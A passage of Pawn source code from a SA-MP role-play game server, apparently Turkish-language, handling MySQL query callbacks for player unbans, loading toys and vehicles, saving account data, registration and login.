				format(szMessage, sizeof(szMessage), "Ýsim: %s | IP: %s", szPlayerName, szPlayerIP);
				SendClientMessage(extraid, COLOR_WHITE, szMessage);
	        } else SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu yok.");

	        mysql_free_result(g_MySQLConnections[0]);
	    }
	    case THREAD_CHECK_BANNED: {
	        mysql_store_result(g_MySQLConnections[0]);

	        new
	            szResult[128],
	            szMessage[128],
	            szPlayerIP[20],
	            szPlayerName[MAX_PLAYER_NAME],
	            iPlayerBan,
	            iPlayerWarnings,
	            iPlayerPermaban;

			if(mysql_fetch_row_format(szResult, "|", g_MySQLConnections[0])) {
			    sscanf(szResult, "p<|>ddds[16]s[20]", iPlayerBan, iPlayerPermaban, iPlayerWarnings, szPlayerIP, szPlayerName);
				print(szResult);

			    if(iPlayerPermaban > 0) {
			        SendClientMessage(extraid, COLOR_GREY, "Bu oyuncunun banýný kaldýramazsýn, süresiz ban yemiþ.");
			        mysql_free_result(g_MySQLConnections[0]);
			    } else {
			        if(iPlayerBan > 0) {
			            RemoveBan(szPlayerIP);

						format(szMessage, sizeof(szMessage), "AdminKomutu: %s (IP: %s) adlý oyuncunun baný %s tarafýndan açýldý.", szPlayerName, szPlayerIP, GetPlayerNameEx(extraid));
						ABroadCast(COLOR_LIGHTRED, szMessage, 1);

						format(szMessage, sizeof(szMessage), "AdminKomutu: %s (IP: %s) adlý oyuncunun baný %s tarafýndan açýldý.", szPlayerName, szPlayerIP, GetPlayerNameEx(extraid));
						Log("logs/ban.log", szMessage);

						if(iPlayerWarnings >= 3) {
							format(szQuery, sizeof(szQuery), "UPDATE players SET Banned = 0, Warnings = 0 WHERE Username = '%s'", szPlayerName);
						} else format(szQuery, sizeof(szQuery), "UPDATE players SET Banned = 0 WHERE Username = '%s'", szPlayerName);
						mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
			        } else SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu banlý deðil.");
			    }
			} else SendClientMessage(extraid, COLOR_GREY, "Aranan kriterlerde satýr bulunamadý.");

	        mysql_free_result(g_MySQLConnections[0]);
	    }
	    case THREAD_DELETE_PLAYER_OBJECT: {
	        new
	            string[64],
	            listitem = GetPVarInt(extraid, "deleteObject");

			PlayerToyInfo[extraid][listitem][ptModelID] = 0;
			PlayerToyInfo[extraid][listitem][ptBone] = 1;
			PlayerToyInfo[extraid][listitem][ptRealID] = 0;
			PlayerToyInfo[extraid][listitem][ptPosX] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosY] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosZ] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosX] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosY] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosZ] = 0.0;

			format(string, sizeof(string), "%d. slotundaki oyuncaðý sildin.", listitem);
		    ShowPlayerDialogEx(extraid, 0, DIALOG_STYLE_MSGBOX, "Oyuncak Menüsü - Oyuncak Silme", string, "Tamam", "");

		    DeletePVar(extraid, "deleteObject");
		}
	    case THREAD_LOAD_P_ITEMS_CHAIN_1: {
	        mysql_store_result(g_MySQLConnections[0]);

	        new
	            szReturn[16],
	            iSlot = 0;

	        while(mysql_retrieve_row()) {
	            mysql_fetch_field_row(szReturn, "ID", g_MySQLConnections[0]);
	            PlayerToyInfo[extraid][iSlot][ptRealID] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "ModelID", g_MySQLConnections[0]);
	            PlayerToyInfo[extraid][iSlot][ptModelID] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Bone", g_MySQLConnections[0]);
	            PlayerToyInfo[extraid][iSlot][ptBone] = strval(szReturn);

				if(PlayerToyInfo[extraid][iSlot][ptBone] > 18 || PlayerToyInfo[extraid][iSlot][ptBone] < 1) PlayerToyInfo[extraid][iSlot][ptBone] = 1;

				mysql_fetch_field_row(szReturn, "PosX", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptPosX] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "PosY", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptPosY] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "PosZ", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptPosZ] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "RotX", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptRotX] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "RotY", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptRotY] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "RotZ", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptRotZ] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "ScaX", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptScaleX] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "ScaY", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptScaleY] = floatstr(szReturn);

				mysql_fetch_field_row(szReturn, "ScaZ", g_MySQLConnections[0]);
				PlayerToyInfo[extraid][iSlot][ptScaleZ] = floatstr(szReturn);

				iSlot++;
	        }

	        mysql_free_result(g_MySQLConnections[0]);

	        format(szQuery, sizeof(szQuery), "SELECT playervehicles.* FROM playervehicles INNER JOIN players ON playervehicles.Owner = players.ID WHERE players.ID = '%d' ORDER BY playervehicles.Owner ASC LIMIT %d", PlayerInfo[extraid][pID], MAX_PLAYERVEHICLES);
	        mysql_query(szQuery, THREAD_LOAD_P_ITEMS_CHAIN_2, extraid, g_MySQLConnections[0]);
	    }
	    case THREAD_LOAD_P_ITEMS_CHAIN_2: {
	        mysql_store_result(g_MySQLConnections[0]);

	        new
	            szReturn[16],
	            iSlot = 0;

	        while(mysql_retrieve_row()) {
	            mysql_fetch_field_row(szReturn, "ID", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvRealID] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "PosX", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvPosX] = floatstr(szReturn);

	            mysql_fetch_field_row(szReturn, "PosY", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvPosY] = floatstr(szReturn);

	            mysql_fetch_field_row(szReturn, "PosZ", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvPosZ] = floatstr(szReturn);

	            mysql_fetch_field_row(szReturn, "PosAngle", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvPosAngle] = floatstr(szReturn);

	            mysql_fetch_field_row(szReturn, "ModelID", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvModelId] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "LockType", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvLock] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Locked", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvLocked] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "PaintJob", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvPaintJob] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Color1", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvColor1] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Color2", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvColor2] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Price", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvPrice] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Ticket", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvTicket] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Weapon0", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvWeapons][0] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Weapon1", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvWeapons][1] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Weapon2", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvWeapons][2] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "WepUpgrade", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvWepUpgrade] = strval(szReturn);

	            /*mysql_fetch_field_row(szReturn, "Fuel", g_MySQLConnections[0]);*/
	            PlayerVehicleInfo[extraid][iSlot][pvFuel] = 100.0; //floatstr(szReturn);

	            mysql_fetch_field_row(szReturn, "Impound", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvImpounded] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Spawned", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvSpawned] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Disabled", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvDisabled] = strval(szReturn);

	            mysql_fetch_field_row(PlayerVehicleInfo[extraid][iSlot][pvNumberPlate], "NumPlate", g_MySQLConnections[0]);

	            mysql_fetch_field_row(szReturn, "Disabled", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvDisabled] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod0", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][0] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod1", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][1] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod2", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][2] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod3", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][3] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod4", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][4] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod5", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][5] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod6", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][6] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod7", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][7] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod8", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][8] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod9", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][9] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod10", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][10] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod11", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][11] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod12", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][12] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod13", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][13] = strval(szReturn);

	            mysql_fetch_field_row(szReturn, "Mod14", g_MySQLConnections[0]);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][14] = strval(szReturn);
	            if(AdminLoggedInBefore[extraid] == 0) LoadPlayerVehicles(extraid);
	            CheckPlayerVehicleForDesync(extraid, PlayerVehicleInfo[extraid][iSlot][pvId]);

				iSlot++;
	        }

	        mysql_free_result(g_MySQLConnections[0]);

	        format(szQuery, sizeof(szQuery), "SELECT kills.* FROM kills INNER JOIN players ON kills.killerID = players.ID OR kills.killedID = players.ID WHERE players.ID = '%d' ORDER BY kills.killTS ASC LIMIT 10", PlayerInfo[extraid][pID]);
	        mysql_query(szQuery, THREAD_LOAD_P_ITEMS_CHAIN_3, extraid, g_MySQLConnections[0]);
	    }
	    case THREAD_LOAD_P_ITEMS_CHAIN_3: {
	        mysql_store_result(g_MySQLConnections[0]);

     	    new
	        	iSlot = 0;

	        while(mysql_retrieve_row()) {
	            iSlot++;
	            switch(iSlot) {
					case 0: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog0], "killText", g_MySQLConnections[0]);
					case 1: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog1], "killText", g_MySQLConnections[0]);
					case 2: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog2], "killText", g_MySQLConnections[0]);
					case 3: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog3], "killText", g_MySQLConnections[0]);
					case 4: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog4], "killText", g_MySQLConnections[0]);
					case 5: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog5], "killText", g_MySQLConnections[0]);
					case 6: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog6], "killText", g_MySQLConnections[0]);
					case 7: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog7], "killText", g_MySQLConnections[0]);
					case 8: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog8], "killText", g_MySQLConnections[0]);
					case 9: mysql_fetch_field_row(PlayerInfo[extraid][pKillLog9], "killText", g_MySQLConnections[0]);
				}
	        }

	        mysql_free_result(g_MySQLConnections[0]);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_1: {
			format(szQuery, sizeof(szQuery), "UPDATE players SET Job = %d, Job2 = %d, UpgradePoints = %d, SpawnArmor = '%f', Cash = %d, Bank = %d, Insurance = %d, Crimes = %d, Arrested = %d, WantedLevel = %d, Health = '%f', Armor = '%f', \
			Pot = %d, Crack = %d, Radio = %d, RadioFreq = %d, Phonebook = %d, Dice = %d, CDPlayer = %d, Materials = %d, Rope = %d, Cigars = %d, Sprunk = %d, Spraycan = %d, House = %d, House2 = %d, Renting = %d, Interior = %d, VirtualWorld = %d, Jailed = %d WHERE ID = %d",
			PlayerInfo[extraid][pJob], PlayerInfo[extraid][pJob2], PlayerInfo[extraid][gPupgrade], PlayerInfo[extraid][pSarmor], PlayerInfo[extraid][pCash], PlayerInfo[extraid][pBank], PlayerInfo[extraid][pInsurance], PlayerInfo[extraid][pCrimes],
			PlayerInfo[extraid][pArrested], PlayerInfo[extraid][pWantedLevel], PlayerInfo[extraid][pHealth], PlayerInfo[extraid][pArmor], PlayerInfo[extraid][pPot], PlayerInfo[extraid][pCrack], PlayerInfo[extraid][pRadio], PlayerInfo[extraid][pRadioFreq],
			PlayerInfo[extraid][pPhoneBook], PlayerInfo[extraid][pDice], PlayerInfo[extraid][pCDPlayer], PlayerInfo[extraid][pMats], PlayerInfo[extraid][pRope], PlayerInfo[extraid][pCigar], PlayerInfo[extraid][pSprunk], PlayerInfo[extraid][pSpraycan], PlayerInfo[extraid][pHouse],
			PlayerInfo[extraid][pHouse2], PlayerInfo[extraid][pRenting], PlayerInfo[extraid][pInt], PlayerInfo[extraid][pVW], PlayerInfo[extraid][pJailed], PlayerInfo[extraid][pID]);

			mysql_query(szQuery, THREAD_SAVE_ACCOUNT_CHAIN_2, extraid, g_MySQLConnections[0]);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_2: {
	        format(szQuery, sizeof(szQuery), "UPDATE players SET JailTime = %d, Gun0 = %d, Gun1 = %d, Gun2 = %d, Gun3 = %d, Gun4 = %d, Gun5 = %d, Gun6 = %d, Gun7 = %d, Gun8 = %d, Gun9 = %d, Gun10 = %d, Gun11 = %d, Paycheck = %d, PayReady = %d, Hospital = %d, \
			DetSkill = %d, FishSkill = %d, LawSkill = %d, DrugsSkill = %d, SmugglerSkill = %d, ArmsSkill = %d, MechSkill = %d, BoxSkill = %d, TruckSkill = %d, CarSkill = %d, LawyerTime = %d, LawyerFreeTime = %d, DrugsTime = %d, MechTime = %d WHERE ID = %d",
			PlayerInfo[extraid][pJailTime], PlayerInfo[extraid][pGuns][0], PlayerInfo[extraid][pGuns][1], PlayerInfo[extraid][pGuns][2], PlayerInfo[extraid][pGuns][3], PlayerInfo[extraid][pGuns][4], PlayerInfo[extraid][pGuns][5], PlayerInfo[extraid][pGuns][6], PlayerInfo[extraid][pGuns][7],
			PlayerInfo[extraid][pGuns][8], PlayerInfo[extraid][pGuns][9], PlayerInfo[extraid][pGuns][10], PlayerInfo[extraid][pGuns][11], PlayerInfo[extraid][pPayCheck], PlayerInfo[extraid][pPayReady], PlayerInfo[extraid][pHospital], PlayerInfo[extraid][pDetSkill], PlayerInfo[extraid][pFishSkill],
			PlayerInfo[extraid][pLawSkill], PlayerInfo[extraid][pDrugsSkill], PlayerInfo[extraid][pSmugSkill], PlayerInfo[extraid][pArmsSkill], PlayerInfo[extraid][pMechSkill], PlayerInfo[extraid][pBoxSkill], PlayerInfo[extraid][pTruckSkill], PlayerInfo[extraid][pCarSkill], PlayerInfo[extraid][pLawyerTime],
			PlayerInfo[extraid][pLawyerFreeTime], PlayerInfo[extraid][pDrugsTime], PlayerInfo[extraid][pMechTime], PlayerInfo[extraid][pID]);

			mysql_query(szQuery, THREAD_SAVE_ACCOUNT_CHAIN_3, extraid, g_MySQLConnections[0]);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_3: {
			format(szQuery, sizeof(szQuery), "UPDATE players SET SexTime = %d, CarTime = %d, Fishes = %d, BiggestFish = %d, pWEXists = %d, pWX = '%f', pWY = '%f', pWZ = '%f', pWVW = %d, pWInt = %d, pWValue = %d, pWSeeds = %d, Wins = %d, Loses = %d, \
			FightingStyle = %d, Screwdriver = %d, Wristwatch = %d, Tire = %d, Firstaid = %d, Rccam = %d, Receiver = %d, GPS = %d, Sweep = %d, SweepLeft = %d, Bugged = %d, OnDuty = %d, CarLic = %d, FlyLic = %d, GunLic = %d, Division = %d WHERE ID = %d",
			PlayerInfo[extraid][pSexTime], PlayerInfo[extraid][pCarTime], PlayerInfo[extraid][pFishes], PlayerInfo[extraid][pBiggestFish], PlayerInfo[extraid][pWeedObject], PlayerInfo[extraid][pWeedPos][0], PlayerInfo[extraid][pWeedPos][1], PlayerInfo[extraid][pWeedPos][2],
			PlayerInfo[extraid][pWeedVW], PlayerInfo[extraid][pWeedInt], PlayerInfo[extraid][pWeedGrowth], PlayerInfo[extraid][pWSeeds], PlayerInfo[extraid][pWins], PlayerInfo[extraid][pLoses], PlayerInfo[extraid][pFightStyle], PlayerInfo[extraid][pScrewdriver],
			PlayerInfo[extraid][pWristwatch], PlayerInfo[extraid][pTire], PlayerInfo[extraid][pFirstaid], PlayerInfo[extraid][pRccam], PlayerInfo[extraid][pReceiver], PlayerInfo[extraid][pGPS], PlayerInfo[extraid][pSweep], PlayerInfo[extraid][pSweepLeft],
			PlayerInfo[extraid][pBugged], PlayerInfo[extraid][pDuty], PlayerInfo[extraid][pCarLic], PlayerInfo[extraid][pFlyLic], PlayerInfo[extraid][pGunLic], PlayerInfo[extraid][pDivision], PlayerInfo[extraid][pID]);

			mysql_query(szQuery, THREAD_SAVE_ACCOUNT_CHAIN_4, extraid, g_MySQLConnections[0]);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_4: {
	        // Escape strings for now....
	        new
	            szPrisonedBy[MAX_PLAYER_NAME],
	            szPrisonReason[128],
	            szContractBy[MAX_PLAYER_NAME],
	            szContractDetail[128];

			mysql_real_escape_string(PlayerInfo[extraid][pPrisonedBy], szPrisonedBy, g_MySQLConnections[0]);
			mysql_real_escape_string(PlayerInfo[extraid][pPrisonReason], szPrisonReason, g_MySQLConnections[0]);

			mysql_real_escape_string(PlayerInfo[extraid][pContractBy], szContractBy, g_MySQLConnections[0]);
			mysql_real_escape_string(PlayerInfo[extraid][pContractDetail], szContractDetail, g_MySQLConnections[0]);

			format(szQuery, sizeof(szQuery), "UPDATE players SET TicketTime = %d, HeadValue = %d, ContractBy = '%s', ContractDetail = '%s', Bombs = %d, CHits = %d, FHits = %d, PrisonedBy = '%s', PrisonReason = '%s', AcceptReport = %d, TrashReport = %d, Accent = %d, \
			NewMuted = %d, NewMutedTotal = %d, AdMuted = %d, AdMutedTotal = %d, ReportMuted = %d, ReportMutedTotal = %d, ReportMutedTime = %d, Speedo = %d, GCMuted = %d, GCMutedTime = %d, CallsAccepted = %d, PatientsDelivered = %d WHERE ID = %d",
			PlayerInfo[extraid][pTicketTime], PlayerInfo[extraid][pHeadValue], szContractBy, szContractDetail, PlayerInfo[extraid][pBombs], PlayerInfo[extraid][pCHits], PlayerInfo[extraid][pFHits], szPrisonedBy, szPrisonReason,
			PlayerInfo[extraid][pAcceptReport], PlayerInfo[extraid][pTrashReport], PlayerInfo[extraid][pAccent], PlayerInfo[extraid][pNMute], PlayerInfo[extraid][pNMuteTotal], PlayerInfo[extraid][pADMute], PlayerInfo[extraid][pADMuteTotal], PlayerInfo[extraid][pRMuted], PlayerInfo[extraid][pRMutedTotal],
			PlayerInfo[extraid][pRMutedTime], PlayerInfo[extraid][pSpeedo], PlayerInfo[extraid][pGCMuted], PlayerInfo[extraid][pGCMutedTime], PlayerInfo[extraid][pCallsAccepted], PlayerInfo[extraid][pPatientsDelivered], PlayerInfo[extraid][pID]);

			mysql_query(szQuery, THREAD_SAVE_ACCOUNT_CHAIN_5, extraid, g_MySQLConnections[0]);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_5: {
	        // Escape more strings...
	        new
	            szMarriedTo[MAX_PLAYER_NAME],
	            szFlag[128],
	            szReferredBy[MAX_PLAYER_NAME];

			mysql_real_escape_string(PlayerInfo[extraid][pMarriedTo], szMarriedTo, g_MySQLConnections[0]);
			mysql_real_escape_string(PlayerInfo[extraid][pFlag], szFlag, g_MySQLConnections[0]);
			mysql_real_escape_string(PlayerInfo[extraid][pReferredBy], szReferredBy, g_MySQLConnections[0]);

			format(szQuery, sizeof(szQuery), "UPDATE players SET SMSLog = %d, TriageTime = %d, Married = %d, MarriedTo = '%s', Flag = '%s', ReferredBy = '%s', RefTokens = %d, RefTokensOffline = %d, Helper = %d, GangMod = %d, Biz = %d, VBiz = %d, LiveBanned = %d, \
			Gate1 = %d, Gate2 = %d, Gate3 = %d, Blindfold = %d, Gas = %d WHERE ID = %d",
			PlayerInfo[extraid][pSmslog], PlayerInfo[extraid][pTriageTime], PlayerInfo[extraid][pMarried], szMarriedTo, szFlag, szReferredBy, PlayerInfo[extraid][pRefTokens], PlayerInfo[extraid][pRefTokensOffline], PlayerInfo[extraid][pHelper],
   			PlayerInfo[extraid][pGangMod], PlayerInfo[extraid][pBiz], PlayerInfo[extraid][pVBiz], PlayerInfo[extraid][pLiveBanned], PlayerInfo[extraid][pGate1], PlayerInfo[extraid][pGate2], PlayerInfo[extraid][pGate3], PlayerInfo[extraid][pBlindfold], PlayerInfo[extraid][pGas], PlayerInfo[extraid][pID]);
			mysql_query(szQuery, THREAD_SAVING_FINISHED, extraid, g_MySQLConnections[0]);
		}
		case THREAD_SAVING_FINISHED: {
		    if(GetPVarInt(extraid, "attemptLoginAfter") == 1) { // Log the player back in if we need to (new registrations) and avoid saving things we know don't exist yet (i.e. toys)
                ResetPlayerVariables(extraid);
				AttemptPlayerLogin(extraid, PlayerInfo[extraid][pKey]);
            	DeletePVar(extraid, "attemptLoginAfter");
			} else {

				// Save player toys
				for(new v = 0; v < MAX_PLAYERTOYS; v++) {
				    if(PlayerToyInfo[extraid][v][ptRealID] >= 1) { // Check to ensure the toy has a real ID, in MySQL (if inserted it'll have a "real ID").
				        format(szQuery, sizeof(szQuery), "UPDATE toys SET ModelID = %d, Bone = %d, PosX = '%f', PosY = '%f', PosZ = '%f', RotX = '%f', RotY = '%f', RotZ = '%f', ScaX = '%f', ScaY = '%f', ScaZ = '%f' WHERE Owner = %d AND ID = %d",
						PlayerToyInfo[extraid][v][ptModelID], PlayerToyInfo[extraid][v][ptBone], PlayerToyInfo[extraid][v][ptPosX], PlayerToyInfo[extraid][v][ptPosY], PlayerToyInfo[extraid][v][ptPosZ], PlayerToyInfo[extraid][v][ptRotX], PlayerToyInfo[extraid][v][ptRotY], PlayerToyInfo[extraid][v][ptRotZ],
						PlayerToyInfo[extraid][v][ptScaleX], PlayerToyInfo[extraid][v][ptScaleY], PlayerToyInfo[extraid][v][ptScaleZ], PlayerInfo[extraid][pID], PlayerToyInfo[extraid][v][ptRealID]);

						mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
				    }
		   		}

		   		// Save player vehicles
				for(new v = 0; v < MAX_PLAYERVEHICLES; v++) {
				    if(PlayerVehicleInfo[extraid][v][pvRealID] >= 1) { // Check to ensure the vehicle has a real ID, in MySQL (if inserted, it'll have a "real ID").
				        format(szQuery, sizeof(szQuery), "UPDATE playervehicles SET PosX = '%f', PosY = '%f', PosZ = '%f', PosAngle = '%f', ModelID = %d, LockType = %d, Locked = %d, PaintJob = %d, Color1 = %d, Color2 = %d, \
						Price = %d, Ticket = %d, Weapon0 = %d, Weapon1 = %d, Weapon2 = %d, WepUpgrade = %d, Impound = %d, Spawned = %d, Disabled = %d, NumPlate = '%s', Mod0 = %d, Mod1 = %d, Mod2 = %d,",
						PlayerVehicleInfo[extraid][v][pvPosX], PlayerVehicleInfo[extraid][v][pvPosY], PlayerVehicleInfo[extraid][v][pvPosZ], PlayerVehicleInfo[extraid][v][pvPosAngle], PlayerVehicleInfo[extraid][v][pvModelId], PlayerVehicleInfo[extraid][v][pvLock], PlayerVehicleInfo[extraid][v][pvLocked], PlayerVehicleInfo[extraid][v][pvPaintJob],
						PlayerVehicleInfo[extraid][v][pvColor1], PlayerVehicleInfo[extraid][v][pvColor2], PlayerVehicleInfo[extraid][v][pvPrice], PlayerVehicleInfo[extraid][v][pvTicket], PlayerVehicleInfo[extraid][v][pvWeapons][0], PlayerVehicleInfo[extraid][v][pvWeapons][1], PlayerVehicleInfo[extraid][v][pvWeapons][2],
						PlayerVehicleInfo[extraid][v][pvWepUpgrade], PlayerVehicleInfo[extraid][v][pvImpounded], PlayerVehicleInfo[extraid][v][pvSpawned], PlayerVehicleInfo[extraid][v][pvDisabled], PlayerVehicleInfo[extraid][v][pvNumberPlate], PlayerVehicleInfo[extraid][v][pvMods][0], PlayerVehicleInfo[extraid][v][pvMods][1], PlayerVehicleInfo[extraid][v][pvMods][2]);

						// Concencating the string seems like the most appropriate method for this type... Don't wanna send more than 1 query per player vehicle.
						format(szQuery, sizeof(szQuery), "%s Mod3 = %d, Mod4 = %d, Mod5 = %d, Mod6 = %d, Mod7 = %d, Mod8 = %d, Mod9 = %d, Mod10 = %d, Mod11 = %d, Mod12 = %d, Mod13 = %d, Mod14 = %d WHERE Owner = %d AND ID = %d", szQuery, PlayerVehicleInfo[extraid][v][pvMods][3], PlayerVehicleInfo[extraid][v][pvMods][4], PlayerVehicleInfo[extraid][v][pvMods][5],
						PlayerVehicleInfo[extraid][v][pvMods][6], PlayerVehicleInfo[extraid][v][pvMods][7], PlayerVehicleInfo[extraid][v][pvMods][8], PlayerVehicleInfo[extraid][v][pvMods][9], PlayerVehicleInfo[extraid][v][pvMods][10], PlayerVehicleInfo[extraid][v][pvMods][11], PlayerVehicleInfo[extraid][v][pvMods][12],
						PlayerVehicleInfo[extraid][v][pvMods][13], PlayerVehicleInfo[extraid][v][pvMods][14], PlayerInfo[extraid][pID], PlayerVehicleInfo[extraid][v][pvRealID]);

						// Submit the huge query...
						mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
				    }
		   		}
            }
		}
	    case THREAD_REGISTER_ACCOUNT: {
			ResetPlayerVariables(extraid);

			gPlayerLogged[extraid] = 1;
			PlayerInfo[extraid][pID] = mysql_insert_id(g_MySQLConnections[0]);
			PlayerInfo[extraid][pReg] = 1;
			GetPVarString(extraid, "password", PlayerInfo[extraid][pKey], 128);
			DeletePVar(extraid, "password");

			SetPVarInt(extraid, "attemptLoginAfter", 1);
			SaveAccount(extraid);

			TotalRegister++;
		}
		case THREAD_LOGIN_ATTEMPT: {
		    mysql_store_result(g_MySQLConnections[0]);

			if(IsPlayerConnected(extraid)) {
			    new
			        szReturn[128],
				    string[128];

		        if(mysql_num_rows(g_MySQLConnections[0]) == 0) { // No rows exist with the specified criteria, so, wrong password!
		            mysql_free_result(g_MySQLConnections[0]);
					ShowMainMenuDialog(extraid, 3);

					gPlayerLogTries[extraid]++;
		        } else {
		            mysql_retrieve_row();

					// Decided against using sscanf as I'd have to create a variable the size of mars. Old school method it is...
					mysql_fetch_field_row(szReturn, "ID", g_MySQLConnections[0]);
					PlayerInfo[extraid][pID] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pKey], "Password", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "Level", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLevel] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "AdminLevel", g_MySQLConnections[0]);
					PlayerInfo[extraid][pAdmin] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pAdminName], "AdminName", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "BanAppealer", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBanAppealer] = strval(szReturn);

